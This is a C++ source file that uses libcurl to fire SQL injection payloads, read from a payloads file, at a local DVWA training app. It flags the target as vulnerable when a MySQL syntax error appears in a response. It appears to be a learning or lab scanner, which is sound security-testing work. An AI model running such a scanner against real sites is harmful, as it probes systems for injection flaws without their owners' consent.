#include <iostream>
#include <string>
#include <fstream>
#include <vector>
#include <curl/curl.h>

// Callback function to store response data
size_t WriteCallback(char *ptr, size_t size, size_t nmemb, std::string *userdata) {
    size_t len = size * nmemb;
    userdata->append(ptr, len);
    return len;
}
// Compute the prefix function for the pattern
std::vector<int> compute_prefix(const std::string& pattern) {
    int n = pattern.size();
    std::vector<int> prefix(n);
    prefix[0] = 0;

    int j = 0;
    for (int i = 1; i < n; i++) {
        while (j > 0 && pattern[j] != pattern[i]) {
            j = prefix[j-1];
        }
        if (pattern[j] == pattern[i]) {
            j++;
        }
        prefix[i] = j;
    }

    return prefix;
}

// Search for the pattern within the text using the KMP algorithm
size_t Find(const std::string& text, const std::string& pattern) {
    int n = text.size();
    int m = pattern.size();

    // Compute the prefix function for the pattern
    std::vector<int> prefix = compute_prefix(pattern);

    int j = 0;
    for (int i = 0; i < n; i++) {
        while (j > 0 && pattern[j] != text[i]) {
            j = prefix[j-1];
        }
        if (pattern[j] == text[i]) {
            j++;
        }
        if (j == m) {
            // Found a match at position i-m+1
            return i-m+1;
        }
    }

    // Pattern not found
    return std::string::npos;
}

int main() {
    CURL *curl = curl_easy_init();
    if (!curl) {
        std::cerr << "Failed to initialize curl\n";
        return 1;
    }

    // URL to send requests to
    //std::string url = "http://localhost/tigernetBD-master/tgnet/login.php";

    // Open the file containing payloads
    std::ifstream infile("payloads.txt");
    if (!infile.is_open()) {
        std::cerr << "Failed to open payloads file\n";
        curl_easy_cleanup(curl);
        return 1;
    }

    // Store the payloads in a vector
    std::vector<std::string> payloads;
    std::string payload;
    while (std::getline(infile, payload)) {
        payloads.push_back(payload);
        std::cout << payload<<"\n";
    }

    // Close the file
    infile.close();

    std::string errrormessage="You have an error in your SQL syntax; check the manual that corresponds to your";
    bool vulnerable=false;

    // Send requests for each payload in the vector
    for (const auto  payload : payloads) {

        std::cout <<"Used payload : "<<payload<<"\n......................\n";
        std::string response;
        std::string url = "http://localhost/DVWA-master/vulnerabilities/sqli/?id=" +payload+"&Submit=Submit";


        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_HTTPGET, 1);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
        //curl_easy_setopt(curl, CURLOPT_HEADERFUNCTION, HeaderCallback);
        curl_easy_setopt(curl, CURLOPT_HEADERDATA, NULL);
        curl_easy_setopt(curl, CURLOPT_HEADER, 1);

        CURLcode res = curl_easy_perform(curl);
        if (res != CURLE_OK) {
            std::cerr << "Failed to perform curl request: " << curl_easy_strerror(res) << "\n";
            curl_easy_cleanup(curl);
            return 1;
        }

        if (response.empty()) {
            std::cerr << "Empty response data\n";
            continue;
        }

        std::cout << "Response: " << response << "\n";
        if(Find(response,errrormessage)!=std::string::npos){
            vulnerable=true;
        }

    }

    curl_easy_cleanup(curl);
    if(vulnerable){
        std::cout << "The website is vulnerable\n";
    }
    else std::cout << "The website is not vulnerable\n";
    return 0;
}
